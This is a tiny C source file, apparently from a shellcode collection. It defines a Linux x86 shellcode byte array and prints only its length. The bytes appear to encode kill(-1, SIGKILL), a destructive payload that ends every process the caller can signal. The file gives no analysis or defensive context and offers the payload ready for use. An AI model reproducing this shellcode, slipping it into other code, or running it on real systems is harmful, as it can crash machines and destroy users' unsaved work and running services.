#include <stdio.h>
#include <string.h>
unsigned char shellcode[] ="\x6a\x25\x58\x6a\xff\x5b\xb1\x09\xcd\x80";

main()
{
	printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
}
